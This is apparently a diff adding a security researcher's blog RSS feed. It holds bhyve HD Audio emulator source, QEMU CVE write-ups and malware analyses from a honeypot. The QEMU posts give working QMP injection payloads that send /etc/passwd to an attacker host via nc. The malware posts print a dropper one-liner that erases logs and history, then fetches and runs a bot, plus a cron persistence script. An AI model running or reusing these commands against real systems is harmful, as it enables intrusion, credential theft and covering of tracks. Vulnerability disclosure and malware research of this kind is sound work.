+ {
+ 	struct hda_codec_cmd_ctl *rirb = &amp;amp;sc-&amp;gt;rirb;
+ 	uint8_t rirbsize = 0;
+ 	uint64_t rirblbase = 0;
+ 	uint64_t rirbubase = 0;
+ 	uint64_t rirbpaddr = 0;
+ 
+ 	rirb-&amp;gt;name = &quot;RIRB&quot;;
+ 
+ 	rirbsize = hda_get_reg_by_offset(sc, HDAC_RIRBSIZE) &amp;amp;		\
+ 		   HDAC_RIRBSIZE_RIRBSIZE_MASK;
+ 	rirb-&amp;gt;size = hda_rirb_sizes[rirbsize];
+ 
+ 	if (!rirb-&amp;gt;size) {
+ 		DPRINTF(&quot;Invalid rirb size\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	rirblbase = hda_get_reg_by_offset(sc, HDAC_RIRBLBASE);
+ 	rirbubase = hda_get_reg_by_offset(sc, HDAC_RIRBUBASE);
+ 
+ 	rirbpaddr = rirblbase | (rirbubase &amp;lt;&amp;lt; 32);
+ 	DPRINTF(&quot;RIRB dma_paddr: %p\n&quot;, (void *)rirbpaddr);
+ 
+ 	rirb-&amp;gt;dma_vaddr = hda_dma_get_vaddr(sc, rirbpaddr,
+ 			HDA_RIRB_ENTRY_LEN * rirb-&amp;gt;size);
+ 	if (!rirb-&amp;gt;dma_vaddr) {
+ 		DPRINTF(&quot;Fail to get the guest virtual address\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	rirb-&amp;gt;wp = hda_get_reg_by_offset(sc, HDAC_RIRBWP);
+ 	rirb-&amp;gt;rp = 0x0000;
+ 
+ 	rirb-&amp;gt;run = 1;
+ 
+ 	hda_print_cmd_ctl_data(rirb);
+ 
+ 	return (0);
+ }
+ 
+ static void *
+ hda_dma_get_vaddr(struct hda_softc *sc, uint64_t dma_paddr, size_t len)
+ {
+ 	struct pci_devinst *pi = sc-&amp;gt;pci_dev;
+ 
+ 	assert(pi);
+ 
+ 	return (paddr_guest2host(pi-&amp;gt;pi_vmctx, (uintptr_t)dma_paddr, len));
+ }
+ 
+ static void
+ hda_dma_st_dword(void *dma_vaddr, uint32_t data)
+ {
+ 	*(uint32_t*)dma_vaddr = data;
+ }
+ 
+ static uint32_t
+ hda_dma_ld_dword(void *dma_vaddr)
+ {
+ 	return (*(uint32_t*)dma_vaddr);
+ }
+ 
+ static inline uint8_t
+ hda_get_stream_by_offsets(uint32_t offset, uint8_t reg_offset)
+ {
+ 	uint8_t stream_ind = (offset - reg_offset) &amp;gt;&amp;gt; 5;
+ 
+ 	assert(stream_ind &amp;lt; HDA_IOSS_NO);
+ 
+ 	return (stream_ind);
+ }
+ 
+ static inline uint32_t
+ hda_get_offset_stream(uint8_t stream_ind)
+ {
+ 	return (stream_ind &amp;lt;&amp;lt; 5);
+ }
+ 
+ static void
+ hda_set_gctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	if (!(value &amp;amp; HDAC_GCTL_CRST)) {
+ 		hda_reset(sc);
+ 	}
+ }
+ 
+ static void
+ hda_set_statests(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	hda_set_reg_by_offset(sc, offset, old);
+ 
+ 	/* clear the corresponding bits written by the software (guest) */
+ 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_STATESTS_IRQ_MASK, 0);
+ 
+ 	hda_update_intr(sc);
+ }
+ 
+ static void
+ hda_set_corbwp(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	hda_corb_run(sc);
+ }
+ 
+ static void
+ hda_set_corbctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 	int err;
+ 	struct hda_codec_cmd_ctl *corb = NULL;
+ 
+ 	if (value &amp;amp; HDAC_CORBCTL_CORBRUN) {
+ 		if (!(old &amp;amp; HDAC_CORBCTL_CORBRUN)) {
+ 			err = hda_corb_start(sc);
+ 			assert(!err);
+ 		}
+ 	} else {
+ 		corb = &amp;amp;sc-&amp;gt;corb;
+ 		memset(corb, 0, sizeof(*corb));
+ 	}
+ 
+ 	hda_corb_run(sc);
+ }
+ 
+ static void
+ hda_set_rirbctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 	int err;
+ 	struct hda_codec_cmd_ctl *rirb = NULL;
+ 
+ 	if (value &amp;amp; HDAC_RIRBCTL_RIRBDMAEN) {
+ 		err = hda_rirb_start(sc);
+ 		assert(!err);
+ 	} else {
+ 		rirb = &amp;amp;sc-&amp;gt;rirb;
+ 		memset(rirb, 0, sizeof(*rirb));
+ 	}
+ }
+ 
+ static void
+ hda_set_rirbsts(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	hda_set_reg_by_offset(sc, offset, old);
+ 
+ 	/* clear the corresponding bits written by the software (guest) */
+ 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_RIRBSTS_IRQ_MASK, 0);
+ 
+ 	hda_update_intr(sc);
+ }
+ 
+ static void
+ hda_set_dpiblbase(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 	uint64_t dpiblbase = 0;
+ 	uint64_t dpibubase = 0;
+ 	uint64_t dpibpaddr = 0;
+ 
+ 	if ((value &amp;amp; HDAC_DPLBASE_DPLBASE_DMAPBE) != (old &amp;amp;		\
+ 				HDAC_DPLBASE_DPLBASE_DMAPBE)) {
+ 		if (value &amp;amp; HDAC_DPLBASE_DPLBASE_DMAPBE) {
+ 			dpiblbase = value &amp;amp; HDAC_DPLBASE_DPLBASE_MASK;
+ 			dpibubase = hda_get_reg_by_offset(sc, HDAC_DPIBUBASE);
+ 
+ 			dpibpaddr = dpiblbase | (dpibubase &amp;lt;&amp;lt; 32);
+ 			DPRINTF(&quot;DMA Position In Buffer dma_paddr: %p\n&quot;,
+ 			    (void *)dpibpaddr);
+ 
+ 			sc-&amp;gt;dma_pib_vaddr = hda_dma_get_vaddr(sc, dpibpaddr,
+ 					HDA_DMA_PIB_ENTRY_LEN * HDA_IOSS_NO);
+ 			if (!sc-&amp;gt;dma_pib_vaddr) {
+ 				DPRINTF(&quot;Fail to get the guest \
+ 					 virtual address\n&quot;);
+ 				assert(0);
+ 			}
+ 		} else {
+ 			DPRINTF(&quot;DMA Position In Buffer Reset\n&quot;);
+ 			sc-&amp;gt;dma_pib_vaddr = NULL;
+ 		}
+ 	}
+ }
+ 
+ static void
+ hda_set_sdctl(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint8_t stream_ind = hda_get_stream_by_offsets(offset, HDAC_SDCTL0);
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 	int err;
+ 
+ 	DPRINTF(&quot;stream_ind: 0x%x old: 0x%x value: 0x%x\n&quot;,
+ 	    stream_ind, old, value);
+ 
+ 	if (value &amp;amp; HDAC_SDCTL_SRST) {
+ 		hda_stream_reset(sc, stream_ind);
+ 	}
+ 
+ 	if ((value &amp;amp; HDAC_SDCTL_RUN) != (old &amp;amp; HDAC_SDCTL_RUN)) {
+ 		if (value &amp;amp; HDAC_SDCTL_RUN) {
+ 			err = hda_stream_start(sc, stream_ind);
+ 			assert(!err);
+ 		} else {
+ 			err = hda_stream_stop(sc, stream_ind);
+ 			assert(!err);
+ 		}
+ 	}
+ }
+ 
+ static void
+ hda_set_sdctl2(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	hda_set_field_by_offset(sc, offset - 2, 0x00ff0000, value &amp;lt;&amp;lt; 16);
+ }
+ 
+ static void
+ hda_set_sdsts(struct hda_softc *sc, uint32_t offset, uint32_t old)
+ {
+ 	uint32_t value = hda_get_reg_by_offset(sc, offset);
+ 
+ 	hda_set_reg_by_offset(sc, offset, old);
+ 
+ 	/* clear the corresponding bits written by the software (guest) */
+ 	hda_set_field_by_offset(sc, offset, value &amp;amp; HDA_SDSTS_IRQ_MASK, 0);
+ 
+ 	hda_update_intr(sc);
+ }
+ 
+ static int
+ hda_signal_state_change(struct hda_codec_inst *hci)
+ {
+ 	struct hda_softc *sc = NULL;
+ 	uint32_t sdiwake = 0;
+ 
+ 	assert(hci);
+ 	assert(hci-&amp;gt;hda);
+ 
+ 	DPRINTF(&quot;cad: 0x%x\n&quot;, hci-&amp;gt;cad);
+ 
+ 	sc = hci-&amp;gt;hda;
+ 	sdiwake = 1 &amp;lt;&amp;lt; hci-&amp;gt;cad;
+ 
+ 	hda_set_field_by_offset(sc, HDAC_STATESTS, sdiwake, sdiwake);
+ 	hda_update_intr(sc);
+ 
+ 	return (0);
+ }
+ 
+ static int
+ hda_response(struct hda_codec_inst *hci, uint32_t response, uint8_t unsol)
+ {
+ 	struct hda_softc *sc = NULL;
+ 	struct hda_codec_cmd_ctl *rirb = NULL;
+ 	uint32_t response_ex = 0;
+ 	uint8_t rintcnt = 0;
+ 
+ 	assert(hci);
+ 	assert(hci-&amp;gt;cad &amp;lt;= HDA_CODEC_MAX);
+ 
+ 	response_ex = hci-&amp;gt;cad | unsol;
+ 
+ 	sc = hci-&amp;gt;hda;
+ 	assert(sc);
+ 
+ 	rirb = &amp;amp;sc-&amp;gt;rirb;
+ 
+ 	if (rirb-&amp;gt;run) {
+ 		rirb-&amp;gt;wp++;
+ 		rirb-&amp;gt;wp %= rirb-&amp;gt;size;
+ 
+ 		hda_dma_st_dword(rirb-&amp;gt;dma_vaddr + HDA_RIRB_ENTRY_LEN *	\
+ 				rirb-&amp;gt;wp, response);
+ 		hda_dma_st_dword(rirb-&amp;gt;dma_vaddr + HDA_RIRB_ENTRY_LEN *	\
+ 				rirb-&amp;gt;wp + 0x04, response_ex);
+ 
+ 		hda_set_reg_by_offset(sc, HDAC_RIRBWP, rirb-&amp;gt;wp);
+ 
+ 		sc-&amp;gt;rirb_cnt++;
+ 	}
+ 
+ 	rintcnt = hda_get_reg_by_offset(sc, HDAC_RINTCNT);
+ 	if (sc-&amp;gt;rirb_cnt == rintcnt)
+ 		hda_response_interrupt(sc);
+ 
+ 	return (0);
+ }
+ 
+ static int
+ hda_transfer(struct hda_codec_inst *hci, uint8_t stream, uint8_t dir,
+     void *buf, size_t count)
+ {
+ 	struct hda_softc *sc = NULL;
+ 	struct hda_stream_desc *st = NULL;
+ 	struct hda_bdle_desc *bdl = NULL;
+ 	struct hda_bdle_desc *bdle_desc = NULL;
+ 	uint8_t stream_ind = 0;
+ 	uint32_t lpib = 0;
+ 	uint32_t off = 0;
+ 	size_t left = 0;
+ 	uint8_t irq = 0;
+ 
+ 	assert(hci);
+ 	assert(hci-&amp;gt;hda);
+ 	assert(buf);
+ 	assert(!(count % HDA_DMA_ACCESS_LEN));
+ 
+ 	if (!stream) {
+ 		DPRINTF(&quot;Invalid stream\n&quot;);
+ 		return (-1);
+ 	}
+ 
+ 	sc = hci-&amp;gt;hda;
+ 
+ 	assert(stream &amp;lt; HDA_STREAM_TAGS_CNT);
+ 	stream_ind = sc-&amp;gt;stream_map[dir][stream];
+ 
+ 	if (!dir)
+ 		assert(stream_ind &amp;lt; HDA_ISS_NO);
+ 	else
+ 		assert(stream_ind &amp;gt;= HDA_ISS_NO &amp;amp;&amp;amp; stream_ind &amp;lt; HDA_IOSS_NO);
+ 
+ 	st = &amp;amp;sc-&amp;gt;streams[stream_ind];
+ 	if (!st-&amp;gt;run) {
+ 		DPRINTF(&quot;Stream 0x%x stopped\n&quot;, stream);
+ 		return (-1);
+ 	}
+ 
+ 	assert(st-&amp;gt;stream == stream);
+ 
+ 	off = hda_get_offset_stream(stream_ind);
+ 
+ 	lpib = hda_get_reg_by_offset(sc, off + HDAC_SDLPIB);
+ 
+ 	bdl = st-&amp;gt;bdl;
+ 
+ 	assert(st-&amp;gt;be &amp;lt; st-&amp;gt;bdl_cnt);
+ 	assert(st-&amp;gt;bp &amp;lt; bdl[st-&amp;gt;be].len);
+ 
+ 	left = count;
+ 	while (left) {
+ 		bdle_desc = &amp;amp;bdl[st-&amp;gt;be];
+ 
+ 		if (dir)
+ 			*(uint32_t *)buf =				\
+ 			    hda_dma_ld_dword(bdle_desc-&amp;gt;addr + st-&amp;gt;bp);
+ 		else
+ 			hda_dma_st_dword(bdle_desc-&amp;gt;addr + st-&amp;gt;bp,
+ 					*(uint32_t *)buf);
+ 
+ 		buf += HDA_DMA_ACCESS_LEN;
+ 		st-&amp;gt;bp += HDA_DMA_ACCESS_LEN;
+ 		lpib += HDA_DMA_ACCESS_LEN;
+ 		left -= HDA_DMA_ACCESS_LEN;
+ 
+ 		if (st-&amp;gt;bp == bdle_desc-&amp;gt;len) {
+ 			st-&amp;gt;bp = 0;
+ 			if (bdle_desc-&amp;gt;ioc)
+ 				irq = 1;
+ 			st-&amp;gt;be++;
+ 			if (st-&amp;gt;be == st-&amp;gt;bdl_cnt) {
+ 				st-&amp;gt;be = 0;
+ 				lpib = 0;
+ 			}
+ 			bdle_desc = &amp;amp;bdl[st-&amp;gt;be];
+ 		}
+ 	}
+ 
+ 	hda_set_pib(sc, stream_ind, lpib);
+ 
+ 	if (irq) {
+ 		hda_set_field_by_offset(sc, off + HDAC_SDSTS,
+ 				HDAC_SDSTS_BCIS, HDAC_SDSTS_BCIS);
+ 		hda_update_intr(sc);
+ 	}
+ 
+ 	return (0);
+ }
+ 
+ static void
+ hda_set_pib(struct hda_softc *sc, uint8_t stream_ind, uint32_t pib)
+ {
+ 	uint32_t off = hda_get_offset_stream(stream_ind);
+ 
+ 	hda_set_reg_by_offset(sc, off + HDAC_SDLPIB, pib);
+ 	/* LPIB Alias */
+ 	hda_set_reg_by_offset(sc, 0x2000 + off + HDAC_SDLPIB, pib);
+ 	if (sc-&amp;gt;dma_pib_vaddr)
+ 		*(uint32_t *)(sc-&amp;gt;dma_pib_vaddr + stream_ind *	\
+ 				HDA_DMA_PIB_ENTRY_LEN) = pib;
+ }
+ 
+ static uint64_t hda_get_clock_ns(void)
+ {
+ 	struct timespec ts;
+ 	int err;
+ 
+ 	err = clock_gettime(CLOCK_MONOTONIC, &amp;amp;ts);
+ 	assert(!err);
+ 
+ 	return (ts.tv_sec * 1000000000LL + ts.tv_nsec);
+ }
+ 
+ /*
+  * PCI HDA function definitions
+  */
+ static int
+ pci_hda_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts)
+ {
+ 	struct hda_softc *sc = NULL;
+ 
+ 	assert(ctx != NULL);
+ 	assert(pi != NULL);
+ 
+ 	pci_set_cfgdata16(pi, PCIR_VENDOR, INTEL_VENDORID);
+ 	pci_set_cfgdata16(pi, PCIR_DEVICE, HDA_INTEL_82801G);
+ 
+ 	pci_set_cfgdata8(pi, PCIR_SUBCLASS, PCIS_MULTIMEDIA_HDA);
+ 	pci_set_cfgdata8(pi, PCIR_CLASS, PCIC_MULTIMEDIA);
+ 
+ 	/* select the Intel HDA mode */
+ 	pci_set_cfgdata8(pi, PCIR_HDCTL, 0x01);
+ 
+ 	/* allocate one BAR register for the Memory address offsets */
+ 	pci_emul_alloc_bar(pi, 0, PCIBAR_MEM32, HDA_LAST_OFFSET);
+ 
+ 	/* allocate an IRQ pin for our slot */
+ 	pci_lintr_request(pi);
+ 
+ 	sc = hda_init(opts);
+ 	if (!sc)
+ 		return (-1);
+ 
+ 	sc-&amp;gt;pci_dev = pi;
+ 	pi-&amp;gt;pi_arg = sc;
+ 
+ 	return (0);
+ }
+ 
+ static void
+ pci_hda_write(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
+     int baridx, uint64_t offset, int size, uint64_t value)
+ {
+ 	struct hda_softc *sc = pi-&amp;gt;pi_arg;
+ 	int err;
+ 
+ 	assert(sc);
+ 	assert(baridx == 0);
+ 	assert(size &amp;lt;= 4);
+ 
+ 	DPRINTF(&quot;offset: 0x%lx value: 0x%lx\n&quot;, offset, value);
+ 
+ 	err = hda_write(sc, offset, size, value);
+ 	assert(!err);
+ }
+ 
+ static uint64_t
+ pci_hda_read(struct vmctx *ctx, int vcpu, struct pci_devinst *pi,
+     int baridx, uint64_t offset, int size)
+ {
+ 	struct hda_softc *sc = pi-&amp;gt;pi_arg;
+ 	uint64_t value = 0;
+ 
+ 	assert(sc);
+ 	assert(baridx == 0);
+ 	assert(size &amp;lt;= 4);
+ 
+ 	value = hda_read(sc, offset);
+ 
+ 	DPRINTF(&quot;offset: 0x%lx value: 0x%lx\n&quot;, offset, value);
+ 
+ 	return (value);
+ }
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://wiki.freebsd.org/SummerOfCode2016/HDAudioEmulationForBhyve&lt;/li&gt;
+  &lt;li&gt;https://svnweb.freebsd.org/base?view=revision&amp;amp;revision=349335&lt;/li&gt;
+  &lt;li&gt;https://reviews.freebsd.org/rS349385&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Tue, 25 Jun 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/bhyve_hda_bof/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/bhyve_hda_bof/</guid>
+        
+        <category>proof-of-concept</category>
+        
+        <category>stack overflow</category>
+        
+        <category>buffer overflow</category>
+        
+        <category>hypervisor</category>
+        
+        <category>pci device</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution</title>
+        <description>&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;guest_exec&lt;/code&gt; command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+
+&lt;p&gt;1st, execute the QEMU Guest Agent service&lt;br /&gt;
+2nd, open another console and setup a listener to port 9999&lt;br /&gt;
+3rd, connect to the target and enter the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999']}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2019-12929/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-12929/</guid>
+        
+        <category>remote command execution</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution</title>
+        <description>&lt;p&gt;The QMP &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt; command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.&lt;/p&gt;
+
+&lt;p&gt;1st, execute the QEMU with &lt;code class=&quot;highlighter-rouge&quot;&gt;-qmp tcp:&amp;lt;ip_address&amp;gt;:1234,server,nowait&lt;/code&gt;&lt;br /&gt;
+2nd, open another console and setup a listener to port 9999&lt;br /&gt;
+3rd, connect to the target and enter the following commands:&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{ &quot;execute&quot;: &quot;qmp_capabilities&quot; }
+{&quot;return&quot;: {}}
+{ &quot;execute&quot;: &quot;migrate&quot;, &quot;arguments&quot;: { &quot;uri&quot;: &quot;exec:cat /etc/passwd | nc &amp;lt;attacker_ip&amp;gt; 9999&quot; } }
+{&quot;return&quot;: {}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Wed, 05 Jun 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2019-12928/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-12928/</guid>
+        
+        <category>remote command execution</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2019-5008] QEMU sun4u Denial of Service</title>
+        <description>&lt;p&gt;QEMU 3.1.50 is vulnerable to a NULL pointer dereference, which allows the attacker to cause a denial of service via a device driver.&lt;/p&gt;
+
+&lt;p&gt;Patch diff:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/hw/sparc64/sun4u.c b/hw/sparc64/sun4u.c
+index f76b19e4e9..5772da02cb 100644
+&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/hw/sparc64/sun4u.c
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/hw/sparc64/sun4u.c
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -214,6 +214,11 @@&lt;/span&gt;  typedef struct PowerDevice {
+ } PowerDevice;
+
+ /* Power */
+&lt;span class=&quot;gi&quot;&gt;+static uint64_t power_mem_read(void *opaque, hwaddr addr, unsigned size)
++{
++    return 0;
++}
++
+&lt;/span&gt; static void power_mem_write(void *opaque, hwaddr addr,
+                             uint64_t val, unsigned size)
+ {
+&lt;span class=&quot;p&quot;&gt;@@ -224,6 +229,7 @@&lt;/span&gt;  static void power_mem_write(void *opaque, hwaddr addr,
+ }
+
+ static const MemoryRegionOps power_mem_ops = {
+&lt;span class=&quot;gi&quot;&gt;+    .read = power_mem_read,
+&lt;/span&gt;     .write = power_mem_write,
+     .endianness = DEVICE_NATIVE_ENDIAN,
+     .valid = {
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;https://lists.gnu.org/archive/html/qemu-devel/2019-01/msg00186.html&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        <pubDate>Thu, 03 Jan 2019 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/CVE-2019-5008/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/CVE-2019-5008/</guid>
+        
+        <category>pci device</category>
+        
+        <category>denial of service</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>3945ac76b591cdbd50515b9f65821a64</title>
+        <description>&lt;p&gt;Upon decompiling, there is a subroutine called as &lt;code class=&quot;highlighter-rouge&quot;&gt;encrypt_code&lt;/code&gt;. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).&lt;/p&gt;
+
+&lt;p&gt;key = BB2FA36AAA9541F0&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8049090 &amp;lt;encrypt_code+0&amp;gt;:    push    ebp {__saved_ebp}
+0x8049091 &amp;lt;encrypt_code+1&amp;gt;:    mov     ebp, esp {__saved_ebp}
+0x8049093 &amp;lt;encrypt_code+3&amp;gt;:    push    esi {__saved_esi}
+0x8049094 &amp;lt;encrypt_code+4&amp;gt;:    mov     esi, dword [ebp+0xc {arg2}]
+0x8049097 &amp;lt;encrypt_code+7&amp;gt;:    push    ebx {__saved_ebx}
+0x8049098 &amp;lt;encrypt_code+8&amp;gt;:    mov     ebx, dword [ebp+0x8 {arg1}]
+0x804909b &amp;lt;encrypt_code+11&amp;gt;:    test    esi, esi
+0x804909d &amp;lt;encrypt_code+13&amp;gt;:    jle     0x80490c2
+0x804909f &amp;lt;encrypt_code+15&amp;gt;:    xor     ecx, ecx  {0x0}
+0x80490a1 &amp;lt;encrypt_code+17&amp;gt;:    mov     eax, ecx
+0x80490a3 &amp;lt;encrypt_code+19&amp;gt;:    sar     eax, 0x1f
+0x80490a6 &amp;lt;encrypt_code+22&amp;gt;:    shr     eax, 0x1c
+0x80490a9 &amp;lt;encrypt_code+25&amp;gt;:    lea     edx, [ecx+eax]
+0x80490ac &amp;lt;encrypt_code+28&amp;gt;:    and     edx, 0xf
+0x80490af &amp;lt;encrypt_code+31&amp;gt;:    sub     edx, eax
+0x80490b1 &amp;lt;encrypt_code+33&amp;gt;:    movzx   eax, byte [edx+xorkeys]
+0x80490b8 &amp;lt;encrypt_code+40&amp;gt;:    xor     byte [ecx+ebx], al
+0x80490bb &amp;lt;encrypt_code+43&amp;gt;:    add     ecx, 0x1
+0x80490be &amp;lt;encrypt_code+46&amp;gt;:    cmp     ecx, esi
+0x80490c0 &amp;lt;encrypt_code+48&amp;gt;:    jne     0x80490a1
+0x80490c2 &amp;lt;encrypt_code+50&amp;gt;:    mov     eax, ebx
+0x80490c4 &amp;lt;encrypt_code+52&amp;gt;:    pop     ebx {__saved_ebx}
+0x80490c5 &amp;lt;encrypt_code+53&amp;gt;:    pop     esi {__saved_esi}
+0x80490c6 &amp;lt;encrypt_code+54&amp;gt;:    pop     ebp {__saved_ebp}
+0x80490c7 &amp;lt;encrypt_code+55&amp;gt;:    retn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Some of the encrypted strings:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. m4S4nAC/n&amp;amp;ZV - /var/run/gcc
+2. m4S4nAC/nA - /var/run/
+3. m6_6n3 - /tmp/
+4. m [(n3 - /bin/
+5. m7A4nQ_/nA - /usr/bin/
+6. m.[$n__#4%\\C - /lib/libudev
+7. &amp;amp;,Ak&amp;amp;\\Y&amp;amp;-$\x17ZFV|\x06rr\x02v=R\x1b%/2\x14R[^!\\\'lQ),\t - dns-google.org:60000|a-dns-google.com:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Further execution shows that a Bash script will be downloaded from &lt;code class=&quot;highlighter-rouge&quot;&gt;103.25.9.228&lt;/code&gt; using a HTTP GET request. Last checked on 21/9/08, the IP address is no longer responding to any connection. However, some of the malware post-installation can still be found within the binary itself.&lt;/p&gt;
+
+&lt;p&gt;The post-installation consists of a Bash script named &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/cron.hourly/gcc4.sh&lt;/code&gt; which contains the following lines.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /lib/libudev4.so /lib/libudev4.so.6
+/lib/libudev4.so.6
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed -i \'/\\/etc\\/cron.hourly\\/gcc4.sh/d\' /etc/crontab &amp;amp;&amp;amp; echo \'*/3 * * * * root /etc/cron.hourly/gcc4.sh\' &amp;gt; /etc/crontab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Fri, 21 Sep 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/3945ac76b591cdbd50515b9f65821a64/</guid>
+        
+        <category>malware research</category>
+        
+        <category>reverse engineering</category>
+        
+        <category>honeypot</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>b08f9dc5784532be5b3f695f37c7781b</title>
+        <description>&lt;p&gt;Initial file dropped:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;client&lt;/code&gt; is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.&lt;/p&gt;
+
